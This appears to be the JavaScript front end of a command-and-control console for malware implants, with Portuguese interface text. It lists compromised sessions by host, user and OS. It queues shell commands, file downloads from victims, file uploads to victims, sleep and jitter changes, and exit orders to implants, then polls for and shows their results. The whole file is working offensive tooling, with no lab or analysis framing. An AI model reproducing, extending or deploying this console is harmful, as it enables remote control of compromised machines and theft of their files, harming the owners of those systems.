'use strict';

const OP = {
    BEACON: 1, RESULT: 2, HELLO: 3, TASK: 16, NOTASK: 17,
    SHELL: 32, UPLOAD: 33, DOWNLOAD: 34, INJECT: 35, SLEEP: 36, EXIT: 37
};

const POLL_SESSIONS = 3000;
const POLL_RESULTS = 2000;

const state = {
    sessions: [],
    active: null,
    online: false,
    timerSess: null,
    timerRes: null,
    seen: new Set()
};

const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => Array.from(document.querySelectorAll(sel));

const ESC = {
    '&': '&' + 'amp;',
    '<': '&' + 'lt;',
    '>': '&' + 'gt;',
    '"': '&' + 'quot;',
    "'": '&' + '#' + '39;'
};

function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, (c) => ESC[c]);
}

function hexToBytes(hex) {
    const clean = String(hex || '').replace(/[^0-9a-fA-F]/g, '');
    if (clean.length % 2) return new Uint8Array(0);
    const out = new Uint8Array(clean.length / 2);
    for (let i = 0; i < out.length; i++) out[i] = parseInt(clean.substr(i * 2, 2), 16);
    return out;
}

function bytesToHex(bytes) {
    let s = '';
    for (let i = 0; i < bytes.length; i++) s += bytes[i].toString(16).padStart(2, '0');
    return s;
}

function bytesToText(bytes) {
    try {
        return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
    } catch {
        return '';
    }
}

function fmtAge(sec) {
    if (sec < 0) return 'nunca';
    if (sec < 60) return sec + 's';
    if (sec < 3600) return Math.floor(sec / 60) + 'm';
    if (sec < 86400) return Math.floor(sec / 3600) + 'h';
    return Math.floor(sec / 86400) + 'd';
}

function status(msg) {
    $('#sb-msg').textContent = msg;
}

async function api(path, body) {
    const opts = body === undefined
        ? { method: 'GET', cache: 'no-store' }
        : { method: 'POST', cache: 'no-store', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) };
    const r = await fetch(path, opts);
    const txt = await r.text();
    let json = null;
    try { json = txt ? JSON.parse(txt) : null; } catch { json = null; }
    if (!r.ok) {
        const msg = (json && json.error) ? json.error : ('HTTP ' + r.status);
        throw new Error(msg);
    }
    return json;
}

async function sendTask(op, payloadBytes) {
    if (!state.active) throw new Error('nenhuma sessao ativa');
    const body = {
        sid: state.active.id,
        op: op,
        payload: bytesToHex(payloadBytes || new Uint8Array(0))
    };
    const res = await api('/op/task', body);
    return res && res.task_id;
}

function setOnline(on) {
    state.online = on;
    const el = $('#conn');
    el.textContent = on ? 'online' : 'offline';
    el.className = 'pill ' + (on ? 'live' : 'dead');
}

async function refreshSessions() {
    try {
        const list = await api('/op/sessions');
        state.sessions = Array.isArray(list) ? list : [];
        setOnline(true);
        renderSessions();
        if (state.active) {
            const cur = state.sessions.find((s) => s.id === state.active.id);
            if (cur) {
                state.active = cur;
                renderHeader();
            } else {
                clearSession();
                status('sessao ativa desapareceu');
            }
        }
        status('sessoes sincronizadas · ' + state.sessions.length);
    } catch (e) {
        setOnline(false);
        status('servidor inacessivel: ' + e.message);
    }
}

function renderSessions() {
    const list = $('#sess-list');
    const empty = $('#sess-empty');
    $('#sess-count').textContent = String(state.sessions.length);

    list.innerHTML = '';
    if (!state.sessions.length) {
        empty.classList.remove('hidden');
        return;
    }
    empty.classList.add('hidden');

    for (const s of state.sessions) {
        const li = document.createElement('li');
        if (state.active && state.active.id === s.id) li.classList.add('active');

        const led = s.alive ? 'on' : 'off';
        const pend = s.pending > 0 ? '<span class="sl-pend">' + s.pending + ' pend</span>' : '';

        li.innerHTML =
            '<div class="sl-row1">' +
            '<span class="sl-led ' + led + '"></span>' +
            '<span>' + escapeHtml(s.host || s.id.slice(0, 12)) + '</span>' +
            pend +
            '</div>' +
            '<div class="sl-row2">' +
            escapeHtml((s.user || '?') + '@' + (s.os || '?')) +
            ' · ' + fmtAge(s.age) +
            ' · ' + escapeHtml(s.id.slice(0, 12)) +
            '</div>';

        li.addEventListener('click', () => selectSession(s.id));
        list.appendChild(li);
    }
}

function selectSession(sid) {
    const s = state.sessions.find((x) => x.id === sid);
    if (!s) return;
    state.active = s;
    state.seen.clear();
    $('#placeholder').classList.add('hidden');
    $('#session-panel').classList.remove('hidden');
    renderSessions();
    renderHeader();
    clearTerm();
    clearResults();
    termLine('[sessao] ' + (s.host || '?') + ' · ' + s.id, 't-sys');
    status('sessao ativa · ' + s.id);
    stopResultPoll();
    startResultPoll();
}

function renderHeader() {
    const s = state.active;
    if (!s) return;
    $('#sh-host').textContent = s.host || s.id;
    $('#sh-meta').textContent = [
        'user=' + (s.user || '?'),
        'os=' + (s.os || '?'),
        'visto ha ' + fmtAge(s.age),
        'pendentes=' + (s.pending || 0),
        s.alive ? 'viva' : 'morta'
    ].join('  ·  ');
    $('#btn-exit').disabled = !s.alive;
}

function termLine(text, cls) {
    const term = $('#term');
    const div = document.createElement('div');
    if (cls) div.className = cls;
    div.textContent = text;
    term.appendChild(div);
    term.scrollTop = term.scrollHeight;
}

function clearTerm() { $('#term').innerHTML = ''; }
function clearResults() { $('#results-out').innerHTML = ''; }

function clearSession() {
    state.active = null;
    stopResultPoll();
    $('#session-panel').classList.add('hidden');
    $('#placeholder').classList.remove('hidden');
    renderSessions();
}

async function onShellSubmit(ev) {
    ev.preventDefault();
    const input = $('#shell-input');
    const cmd = input.value.trim();
    if (!cmd) return;
    if (!state.active) { termLine('[!] nenhuma sessao ativa', 't-err'); return; }
    input.value = '';
    termLine('$ ' + cmd, 't-cmd');
    try {
        const enc = new TextEncoder().encode(cmd);
        const tid = await sendTask(OP.SHELL, enc);
        termLine('  enfileirado task#' + tid, 't-sys');
        status('shell enfileirado · task#' + tid);
    } catch (e) {
        termLine('[!] ' + e.message, 't-err');
        status('falha: ' + e.message);
    }
}

async function onDownload() {
    if (!state.active) { status('selecione uma sessao'); return; }
    const path = $('#dl-path').value.trim();
    if (!path) return;
    const bytes = new TextEncoder().encode(path);
    const payload = new Uint8Array(2 + bytes.length);
    payload[0] = bytes.length & 0xff;
    payload[1] = (bytes.length >> 8) & 0xff;
    payload.set(bytes, 2);
    try {
        const tid = await sendTask(OP.DOWNLOAD, payload);
        status('download enfileirado · task#' + tid);
        switchTab('results');
    } catch (e) {
        status('falha: ' + e.message);
    }
}

async function onUpload() {
    if (!state.active) { status('selecione uma sessao'); return; }
    const fileInput = $('#ul-file');
    const remote = $('#ul-path').value.trim();
    if (!fileInput.files.length) { status('escolha um arquivo local'); return; }
    if (!remote) { status('informe o caminho remoto'); return; }

    const file = fileInput.files[0];
    const st = $('#ul-status');
    st.textContent = 'lendo ' + file.name + ' (' + file.size + ' bytes)...';

    try {
        const buf = new Uint8Array(await file.arrayBuffer());
        const remBytes = new TextEncoder().encode(remote);
        if (remBytes.length > 0xffff) throw new Error('caminho remoto longo demais');
        const payload = new Uint8Array(2 + remBytes.length + buf.length);
        payload[0] = remBytes.length & 0xff;
        payload[1] = (remBytes.length >> 8) & 0xff;
        payload.set(remBytes, 2);
        payload.set(buf, 2 + remBytes.length);

        const tid = await sendTask(OP.UPLOAD, payload);
        st.textContent = 'enfileirado task#' + tid + ' (' + buf.length + ' bytes)';
        status('upload enfileirado · task#' + tid);
    } catch (e) {
        st.textContent = 'falha: ' + e.message;
        status('falha no upload: ' + e.message);
    }
}

async function onSleep() {
    if (!state.active) { status('selecione uma sessao'); return; }
    const ms = parseInt($('#sl-ms').value, 10);
    const jit = parseInt($('#sl-jit').value, 10);
    if (!Number.isFinite(ms) || ms < 1000) { status('sleep minimo 1000ms'); return; }
    if (!Number.isFinite(jit) || jit < 0 || jit > 95) { status('jitter deve ser 0..95'); return; }

    const p = new Uint8Array(8);
    const dv = new DataView(p.buffer);
    dv.setUint32(0, ms, true);
    dv.setUint32(4, jit, true);

    try {
        const tid = await sendTask(OP.SLEEP, p);
        $('#sl-echo').textContent = 'enfileirado task#' + tid + ' · sleep=' + ms + 'ms jitter=' + jit + '%';
        status('cadencia enfileirada · task#' + tid);
    } catch (e) {
        $('#sl-echo').textContent = 'falha: ' + e.message;
        status('falha: ' + e.message);
    }
}

async function onExit() {
    if (!state.active) return;
    if (!confirm('enviar ExitProcess para ' + state.active.host + '?')) return;
    try {
        const tid = await sendTask(OP.EXIT, new Uint8Array(0));
        status('exit enfileirado · task#' + tid);
    } catch (e) {
        status('falha: ' + e.message);
    }
}

async function onKill() {
    if (!state.active) return;
    if (!confirm('remover esta sessao do servidor? o implante continua rodando.')) return;
    try {
        await api('/op/kill', { sid: state.active.id });
        status('sessao removida do servidor');
        clearSession();
        refreshSessions();
    } catch (e) {
        status('falha: ' + e.message);
    }
}

function renderResults(items) {
    const box = $('#results-out');
    let added = 0;

    for (const r of items) {
        const key = r.task_id;
        if (state.seen.has(key)) continue;
        state.seen.add(key);

        const raw = hexToBytes(r.data || '');
        const isText = r.op === OP.SHELL;
        const el = document.createElement('div');
        el.className = 'res-item';

        const head = document.createElement('div');
        head.className = 'res-head';
        head.textContent = 'task#' + r.task_id + ' · op=' + r.op + ' · ' + raw.length + ' bytes';
        el.appendChild(head);

        const body = document.createElement('div');
        body.className = 'res-body' + (isText ? '' : ' hex');

        if (isText) {
            const text = raw.length >= 4 ? bytesToText(raw.subarray(4)) : bytesToText(raw);
            const code = raw.length >= 4
                ? (raw[0] | (raw[1] << 8) | (raw[2] << 16) | (raw[3] << 24)) >>> 0
                : null;
            if (code !== null) head.textContent += ' · exit=' + code;
            body.textContent = text || '(sem saida)';
        } else {
            const asText = bytesToText(raw);
            const printable = asText.replace(/[^\x20-\x7e\r\n\t]/g, '');
            if (printable.length >= raw.length * 0.85 && raw.length < 64 * 1024) {
                body.textContent = asText;
                body.classList.remove('hex');
            } else {
                body.textContent = r.data || '(vazio)';
            }
        }

        el.appendChild(body);
        box.appendChild(el);
        added++;
    }

    if (added) box.scrollTop = box.scrollHeight;
}

async function pollResults() {
    if (!state.active) return;
    if (!$('#res-auto').checked) return;
    try {
        const items = await api('/op/results', { sid: state.active.id });
        if (Array.isArray(items) && items.length) {
            renderResults(items);
            status('recebidos ' + items.length + ' resultado(s)');
            driveFromResults(items);
        }
    } catch (e) {
        if (!state.online) return;
        status('poll de resultados falhou: ' + e.message);
    }
}

function driveFromResults(items) {
    for (const r of items) {
        const raw = hexToBytes(r.data || '');
        if (r.op === OP.SHELL) {
            const text = raw.length >= 4 ? bytesToText(raw.subarray(4)) : bytesToText(raw);
            termLine('  <- task#' + r.task_id + (text ? '\n' + text.replace(/\s+$/, '') : ' (sem saida)'), 't-res');
        } else if (r.op === OP.UPLOAD) {
            termLine('  <- upload task#' + r.task_id + ': ' + bytesToText(raw).trim(), 't-res');
        } else if (r.op === OP.DOWNLOAD) {
            termLine('  <- download task#' + r.task_id + ': ' + raw.length + ' bytes (ver aba saida)', 't-res');
        }
    }
}

function startResultPoll() {
    stopResultPoll();
    state.timerRes = setInterval(pollResults, POLL_RESULTS);
}

function stopResultPoll() {
    if (state.timerRes) { clearInterval(state.timerRes); state.timerRes = null; }
}

function switchTab(name) {
    $$('.tab').forEach((t) => t.classList.toggle('active', t.dataset.tab === name));
    $$('.pane').forEach((p) => p.classList.toggle('active', p.dataset.pane === name));
}

function tickClock() {
    const d = new Date();
    $('#clock').textContent = d.toTimeString().slice(0, 8);
}

function bind() {
    $('#shell-form').addEventListener('submit', onShellSubmit);
    $('#btn-dl').addEventListener('click', onDownload);
    $('#btn-ul').addEventListener('click', onUpload);
    $('#btn-sleep').addEventListener('click', onSleep);
    $('#btn-exit').addEventListener('click', onExit);
    $('#btn-kill').addEventListener('click', onKill);
    $('#btn-results').addEventListener('click', () => { switchTab('results'); pollResults(); });
    $('#btn-res-clear').addEventListener('click', () => { state.seen.clear(); clearResults(); });
    $('#btn-refresh').addEventListener('click', refreshSessions);

    $$('.tab').forEach((t) => t.addEventListener('click', () => switchTab(t.dataset.tab)));

    document.addEventListener('keydown', (ev) => {
        if (ev.key === '/' && document.activeElement.tagName !== 'INPUT') {
            ev.preventDefault();
            $('#shell-input').focus();
        }
        if (ev.key === 'Escape') $('#shell-input').blur();
    });
}

function boot() {
    bind();
    tickClock();
    setInterval(tickClock, 1000);
    termLine('[c2] console carregado', 't-sys');
    refreshSessions();
    state.timerSess = setInterval(refreshSessions, POLL_SESSIONS);
}

document.addEventListener('DOMContentLoaded', boot);
